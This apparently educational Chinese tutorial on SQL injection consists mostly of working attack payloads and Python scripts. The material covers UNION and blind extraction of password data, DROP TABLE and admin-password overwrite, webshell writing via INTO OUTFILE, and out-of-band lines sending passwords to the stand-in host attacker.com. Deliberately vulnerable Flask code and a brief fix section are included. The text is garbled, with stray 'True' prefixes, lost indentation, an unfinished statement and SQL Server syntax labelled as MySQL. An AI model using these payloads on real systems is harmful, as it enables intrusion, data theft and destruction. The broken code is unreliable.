---
order: 160
tags:
  - 'mysql'
  - 'performance'
  - 'database'
  - 'networking'
difficulty: 'advanced'
title: 'SQL 注入攻击类型与实战'
module: 'mysql'
category: 'MySQL Advanced'
description: '联合注入、盲注、报错注入与绕过技巧。'
author: 'Anonymous'
---

---

## 1. SQL 注入攻击类型 (Attack Types)

### 1.1 带内注入（In-band Injection）

带内注入是最常见和最容易实施的 SQL 注入类型，攻击者使用同一通道发送攻击和获取结果。

#### 1.1.1 基于错误的注入（Error-based）

利用数据库错误信息来获取数据。
**MySQL 示例**：

```sql
 True-- 测试注入点
 True?id=1' AND '1'='1 -- 正常
 True?id=1' AND '1'='2 -- 错误
 True-- 通过错误信息获取数据库版本
 True?id=1' AND 1=CONVERT(int, (SELECT @@version)) --
 True-- 通过错误信息获取当前数据库名
 True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
 True-- 通过错误信息获取用户密码哈希
 True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --
```

**SQL Server 示例**：

```sql
 True-- 使用溢出错误获取数据
 True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --
 True-- 使用 OPENROWSET 进行带外数据获取
 True?id=1'; SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=attacker;Trusted_Connection=yes', 'SELECT password FROM users') --
```

#### 1.1.2 UNION 查询注入

利用 UNION 操作符将恶意查询结果合并到正常查询中。
**前提条件**：

- 原查询与恶意查询的列数必须相同
- 数据类型必须兼容
  **攻击步骤**：

```sql
 True-- 1. 确定列数（使用 ORDER BY）
 True?id=1' ORDER BY 1 --
 True?id=1' ORDER BY 2 --
 True?id=1' ORDER BY 3 --
 True?id=1' ORDER BY 4 -- -- 如果报错，说明只有 3 列
 True-- 2. 确定显示位置
 True?id=-1' UNION SELECT 1, 2, 3 --
 # 观察页面上 1、2、3 哪个位置显示出来了
 True-- 3. 获取数据库信息
 True?id=-1' UNION SELECT 1, database(), version() --
 True?id=-1' UNION SELECT 1, user(), @@version --
 True-- 4. 获取表名
 True?id=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() --
 True?id=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1 --
 True?id=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1 --
 True-- 5. 获取列名
 True?id=-1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' LIMIT 0,1 --
 True?id=-1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' LIMIT 1,1 --
 True-- 6. 获取数据
 True?id=-1' UNION SELECT username, password, email FROM users --
 True?id=-1' UNION SELECT NULL, username, password FROM users --
```

#### 1.1.3 堆叠查询注入（Stacked Queries）

允许在一个查询中执行多条 SQL 语句。

```sql
 True-- MySQL 使用分号分隔多条语句
 True?id=1'; INSERT INTO users (username, password) VALUES ('hacker', '123456'); --
 True-- 删除表
 True?id=1'; DROP TABLE users; --
 True-- 更新数据
 True?id=1'; UPDATE users SET password='hacked' WHERE username='admin'; --
 True-- 获取 shell
 True?id=1'; SELECT * FROM users INTO OUTFILE '/var/www/shell.php'; --
 True-- 延迟后执行（时间盲注结合）
 True?id=1'; SELECT SLEEP(5); --
```

### 1.2 盲注（Blind Injection）

当应用程序不返回数据库错误信息时，攻击者需要通过其他方式推断数据。

#### 1.2.1 布尔盲注（Boolean Blind）

通过应用程序的响应差异来推断数据。
**判断逻辑**：

- 如果注入条件为真，页面正常显示
- 如果注入条件为假，页面显示不同或报错

```sql
 True-- 1. 判断数据库名长度
 True?id=1' AND LENGTH(database()) = 5 -- -- 如果页面正常，说明长度为 5
 True?id=1' AND LENGTH(database()) > 10 --
 True?id=1' AND LENGTH(database()) < 20 --
 True-- 2. 逐字符猜解数据库名
 True?id=1' AND SUBSTRING(database(), 1, 1) = 'a' --
 True?id=1' AND SUBSTRING(database(), 1, 1) = 'b' --
 True?id=1' AND SUBSTRING(database(), 1, 1) = 'c' --
 True-- ... 继续遍历
 True-- 更高效的方法：使用 ASCII 码
 True?id=1' AND ASCII(SUBSTRING(database(), 1, 1)) > 100 --
 True?id=1' AND ASCII(SUBSTRING(database(), 1, 1)) > 110 --
 True?id=1' AND ASCII(SUBSTRING(database(), 1, 1)) = 116 -- -- 确定第一个字符
 True-- 3. 猜解表名
 True?id=1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1) = 'u' --
 True-- 4. 猜解列名
 True?id=1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1) = 'i' --
 True-- 5. 猜解数据
 True?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1) = 'a' --
 True?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1) = 'b' --
```

**自动化脚本**：

```python
 import requests
 def boolean_blind_injection(url):
  # 目标 URL
  target_url = url
  # 获取数据库名长度
  db_name_length = 0
  for i in range(1, 30):
  payload = f"1' AND LENGTH(database())={i} -- "
  response = requests.get(target_url, params={'id': payload})
  if "正常" in response.text:
  db_name_length = i
  print(f"数据库名长度：{i}")
  break
  # 获取数据库名
  db_name = ""
  charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
  for pos in range(1, db_name_length + 1):
  for char in charset:
  payload = f"1' AND SUBSTRING(database(), {pos}, 1)='{char}' -- "
  response = requests.get(target_url, params={'id': payload})
  if "正常" in response.text:
  db_name += char
  print(f"第 {pos} 个字符：{char}")
  break
  print(f"数据库名：{db_name}")
  return db_name
```

#### 1.2.2 时间盲注（Time-based）

利用数据库延迟函数，通过响应时间来推断数据。

```sql
 True-- MySQL 使用 SLEEP() 函数
 True?id=1' AND SLEEP(5) -- -- 如果页面延迟 5 秒，说明存在注入
 True-- 结合布尔逻辑
 True?id=1' AND IF(LENGTH(database())=5, SLEEP(5), 0) --
 True?id=1' AND IF(SUBSTRING(database(), 1, 1)='a', SLEEP(5), 0) --
 True-- 使用 BENCHMARK() 函数（MySQL）
 True?id=1' AND BENCHMARK(5000000, MD5('a')) --
 True-- 使用 WAIT FOR DELAY（SQL Server）
 True?id=1'; WAIT FOR DELAY '0:0:5' --
 True-- 使用 PG_SLEEP（PostgreSQL）
 True?id=1'; SELECT PG_SLEEP(5) --
```

**时间盲注脚本**：

```python
 import requests
 import time
 def time_based_injection(url):
  target_url = url
  # 测试是否存在注入
  payload = "1' AND SLEEP(5) -- "
  start_time = time.time()
  response = requests.get(target_url, params={'id': payload})
  end_time = time.time()
  if end_time - start_time >= 5:
  print("存在时间盲注！")
  else:
  print("不存在时间盲注")
  return
  # 获取数据库名
  db_name = ""
  charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
  for pos in range(1, 20):
  for char in charset:
  payload = f"1' AND IF(SUBSTRING(database(), {pos}, 1)='{char}', SLEEP(3), 0) -- "
  start_time = time.time()
  response = requests.get(target_url, params={'id': payload})
  end_time = time.time()
  if end_time - start_time >= 3:
  db_name += char
  print(f"第 {pos} 个字符：{char}")
  break
  if len(db_name) == pos - 1 and pos > 1:
  break
  print(f"数据库名：{db_name}")
  return db_name
```

### 1.3 二次注入（Second-order Injection）

恶意数据被存储在数据库中，之后在其他查询中被使用时触发注入。
**攻击场景**：

1. **存储阶段**：攻击者注册用户名 `admin' --`，系统将其存储到数据库
2. **触发阶段**：其他功能使用该用户名时，如修改密码的 SQL 查询

```python
 # 1. 用户注册时输入恶意数据
 def register(username, password):
  sql = f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')"
  cursor.execute(sql)
  # 此时不会触发注入，因为只是插入数据
 # 2. 存储的数据：username = 'admin' --'
 # 3. 其他功能使用该数据时触发注入
 def get_user_profile(username):
  sql = f"SELECT * FROM users WHERE username = '{username}'"
  cursor.execute(sql)
  return cursor.fetchone()
 # 4. 攻击者以 admin' -- 用户名登录后调用 get_user_profile
 # 会返回真正的 admin 用户信息
```

**实际案例**：
WordPress 插件中曾发现过二次注入漏洞，攻击者通过评论功能注入恶意代码，该代码在管理员查看评论时执行。

### 1.4 宽字节注入（Wide Byte Injection）

利用字符编码漏洞进行注入。
**原理**：

- 应用程序使用 `addslashes()` 或类似函数转义单引号，添加反斜杠
- 如果数据库使用宽字节编码（如 GBK），攻击者可以利用编码特性绕过

```sql
 True-- 场景：应用程序使用 addslashes() 转义单引号
 True-- 但数据库使用 GBK 编码
 True-- 正常输入被转义
 True-- ' 转义为 \'
 True-- 攻击者输入
 True?id=1%df' OR 1=1 --
 True-- 原理分析：
 True-- %df' 会被 addslashes() 转义为 %df\'
 True-- %df\ 在 GBK 编码中会被解释为一个宽字符「運」
 True-- 最终 SQL 变为：WHERE id = 1運' OR 1=1 --
 True-- 单引号闭合了原来的字符串，OR 1=1 使条件永远为真
```

**防御方法**：

- 使用 UTF-8 编码并设置 `character_set_client=binary`
- 使用参数化查询而不是字符串拼接

### 1.5 联合注入（Union-based Injection）

详见 1.1.2 节。

### 1.6 带外注入（Out-of-band Injection）

当常规渠道（带内）无法获取数据时，使用替代通道。

```sql
 True-- MySQL DNS 通道
 True?id=1' UNION SELECT NULL, (SELECT password FROM users LIMIT 1), NULL INTO OUTFILE '\\\\attacker.com\\share\\output.txt' --
 True-- Oracle UTL_HTTP 带外请求
 True?id=1' AND UTIL_HTTP.REQUEST('http://attacker.com/?data='||password) --
 True-- SQL Server 使用 OPENROWSET
 True?id=1'; SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=attacker;UID=sa;PWD=password', 'SELECT password FROM users') --
```

## 2. SQL 注入实战案例 (Practical Cases)

### 2.1 案例 1：绕过登录验证

#### 2.1.1 场景描述

一个简单的登录页面，用户输入用户名和密码。

#### 2.1.2 危险代码

```php
 <?php
 // 危险代码：直接拼接用户输入
 $username = $_POST['username'];
 $password = $_POST['password'];
 $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
 $result = mysqli_query($conn, $sql);
 if (mysqli_num_rows($result) > 0) {
  echo "登录成功！";
 True} else {
  echo "登录失败！";
 True}
 True?>
```

#### 2.1.3 攻击 Payload

```
 用户名：admin' --
 密码：任意值
```

#### 2.1.4 执行的 SQL

```sql
 SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

#### 2.1.5 结果分析

注释符 `--` 后面的内容被忽略，只验证了 `username = 'admin'`，如果存在 admin 用户，攻击者即可成功登录。

#### 2.1.6 其他 Payload 变体

```sql
 True-- 绕过密码验证
 用户名：admin' OR '1'='1' --
 密码：任意值
 True-- 利用 UNION 获取其他用户信息
 用户名：admin' UNION SELECT 1, 'admin', 'password' --
 密码：任意值
 True-- 使用 1=1 始终为真
 用户名：' OR 1=1 --
 密码：任意值
```

### 2.2 案例 2：UNION 查询获取数据

#### 2.2.1 场景描述

一个商品详情页面，通过 URL 参数 `id` 获取商品信息。

#### 2.2.2 危险代码

```python
 # 危险代码
 def get_product(product_id):
  sql = f"SELECT id, name, price FROM products WHERE id = {product_id}"
  cursor.execute(sql)
  return cursor.fetchone()
```

#### 2.2.3 攻击步骤

**步骤 1：确定列数**

```
 True?id=1' ORDER BY 1 -- -- 正常
 True?id=1' ORDER BY 2 -- -- 正常
 True?id=1' ORDER BY 3 -- -- 正常
 True?id=1' ORDER BY 4 -- -- 报错，说明只有 3 列
```

步骤 2：确定显示位置

```
 True?id=-1' UNION SELECT 1, 2, 3 --
```

步骤 3：获取数据库信息

```
 True?id=-1' UNION SELECT 1, database(), version() --
```

步骤 4：获取表名

```
 True?id=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() --
```

步骤 5：获取列名

```
 True?id=-1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' --
```

步骤 6：获取用户数据

```
 True?id=-1' UNION SELECT username, password, email FROM users --
```

### 2.3 案例 3：布尔盲注

#### 2.3.1 场景描述

页面不显示数据库错误，但对不同的输入有不同的响应。

#### 2.3.2 攻击脚本

```python
 import requests
 def blind_injection(url):
  target_url = url
  # 1. 猜解数据库名长度
  db_name_length = 0
  for i in range(1, 20):
  payload = f"1' AND LENGTH(database())={i} -- "
  response = requests.get(target_url, params={'id': payload})
  if "正常" in response.text:
  db_name_length = i
  break
  print(f"数据库名长度：{db_name_length}")
  # 2. 逐字符猜解数据库名
  db_name = ""
  for i in range(1, db_name_length + 1):
  for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
  payload = f"1' AND SUBSTRING(database(), {i}, 1)='{c}' -- "
  response = requests.get(target_url, params={'id': payload})
  if "正常" in response.text:
  db_name += c
  break
  print(f"数据库名：{db_name}")
  return db_name
```

### 2.4 案例 4：时间盲注

#### 2.4.1 攻击脚本

```python
 import requests
 import time
 def time_based_injection(url):
  target_url = url
  # 测试是否存在时间盲注
  start_time = time.time()
  payload = "1' AND SLEEP(5) -- "
  response = requests.get(target_url, params={'id': payload})
  end_time = time.time()
  if end_time - start_time >= 5:
  print("存在时间盲注！")
  else:
  print("不存在时间盲注")
  return
  # 猜解数据库名
  db_name = ""
  for i in range(1, 20):
  found = False
  for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
  start_time = time.time()
  payload = f"1' AND IF(SUBSTRING(database(), {i}, 1)='{c}', SLEEP(3), 0) -- "
  response = requests.get(target_url, params={'id': payload})
  end_time = time.time()
  if end_time - start_time >= 3:
  db_name += c
  found =
  print(f"找到第 {i} 个字符：{c}")
  break
  if not found:
  break
  print(f"数据库名：{db_name}")
  return db_name
```

### 2.5 案例 5：获取服务器 Shell

#### 2.5.1 前提条件

- MySQL 版本 >= 5.0
- 当前用户具有 FILE 权限
- Web 目录可写
- MySQL 服务账户有执行权限

#### 2.5.2 攻击步骤

```sql
 True-- 1. 检查当前用户权限
 True?id=1' UNION SELECT 1, user(), 3 --
 True-- 2. 检查是否具有 FILE 权限
 True?id=1' AND (SELECT COUNT(*) FROM mysql.user WHERE File_priv='Y') > 0 --
 True-- 3. 写入 Webshell
 True?id=1' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3 INTO OUTFILE '/var/www/html/shell.php' --
 True-- 4. 访问 webshell
 http://target.com/shell.php?cmd=whoami
```

#### 2.5.3 防御措施

- 限制 MySQL 用户的 FILE 权限
- Web 目录设置正确的权限
- 使用参数化查询

## 3. 实战演练 (Hands-on Practice)

### 3.1 搭建测试环境

#### 3.1.1 创建测试数据库

```sql
 True-- 创建数据库
 CREATE DATABASE sqli_test;
 use sqli_test;
 True-- 创建用户表
 CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  username VARCHAR(50) NOT NULL,
  password VARCHAR(50) NOT NULL,
  email VARCHAR(100),
  role VARCHAR(20) DEFAULT 'user',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 True);
 True-- 插入测试数据
 inSERT INTO users (username, password, email, role) VALUES
 ('admin', 'admin123', 'admin@example.com', 'admin'),
 ('user1', 'user123', 'user1@example.com', 'user'),
 ('user2', 'user456', 'user2@example.com', 'user');
 True-- 创建商品表
 CREATE TABLE products (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR(100) NOT NULL,
  price DECIMAL(10, 2) NOT NULL,
  description TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 True);
 True-- 插入商品数据
 inSERT INTO products (name, price, description) VALUES
 ('Product 1', 99.99, 'Description 1'),
 ('Product 2', 199.99, 'Description 2'),
 ('Product 3', 299.99, 'Description 3');
```

#### 3.1.2 创建 Vulnerable Web 应用

```python
 from flask import Flask, request
 import pymysql
 app = Flask(__name__)
 def get_db_connection():
  return pymysql.connect(
  host='localhost',
  user='root',
  password='password',
  database='sqli_test'
  )
 @app.route('/product')
 def product():
  product_id = request.args.get('id')
  # 危险代码：直接拼接
  conn = get_db_connection()
  cursor = conn.cursor()
  sql = f"SELECT * FROM products WHERE id = {product_id}"
  cursor.execute(sql)
  result = cursor.fetchone()
  conn.close()
  return str(result)
 @app.route('/login', methods=['POST'])
 def login():
  username = request.form.get('username')
  password = request.form.get('password')
  # 危险代码：直接拼接
  conn = get_db_connection()
  cursor = conn.cursor()
  sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
  cursor.execute(sql)
  result = cursor.fetchone()
  conn.close()
  if result:
  return "Login successful!"
  else:
  return "Login failed!"
 if __name__ == '__main__':
  app.run(debug=True, host='0.0.0.0', port=5000)
```

### 3.2 攻击演练

#### 3.2.1 练习 1：绕过登录

```
 访问：http://localhost:5000/login
 提交 POST 请求：
 True- 用户名：admin' --
 True- 密码：任意值
```

#### 3.2.2 练习 2：UNION 查询

```
 访问：http://localhost:5000/product?id=-1 UNION SELECT 1, database(), version(), 4
```

#### 3.2.3 练习 3：获取用户数据

```
 访问：http://localhost:5000/product?id=-1 UNION SELECT id, username, password, role FROM users
```

#### 3.2.4 练习 4：时间盲注

```
 # 测试是否存在注入
 访问：http://localhost:5000/product?id=1' AND SLEEP(5) --
 # 如果响应延迟 5 秒，说明存在注入
```

### 3.3 修复演练

```python
 @app.route('/product')
 def product_safe():
  product_id = request.args.get('id')
  # 验证输入
  if not product_id.isdigit():
  return "Invalid product ID"
  # 使用参数化查询
  conn = get_db_connection()
  cursor = conn.cursor()
  sql = "SELECT * FROM products WHERE id = %s"
  cursor.execute(sql, (product_id,))
  result = cursor.fetchone()
  conn.close()
  return str(result)
 @app.route('/login', methods=['POST'])
 def login_safe():
  username = request.form.get('username')
  password = request.form.get('password')
  # 使用参数化查询
  conn = get_db_connection()
  cursor = conn.cursor()
  sql = "SELECT * FROM users WHERE username = %s AND password = %s"
  cursor.execute(sql, (username, password))
  result = cursor.fetchone()
  conn.close()
  if result:
  return "Login successful!"
  else:
  return "Login failed!"
```

---

### 更新日志 (Changelog)

- 2026-05-27: 拆分为独立文件，添加元数据，版本升级至 v4.0.0
- 2026-05-03: 创建 SQL 注入安全防御文档
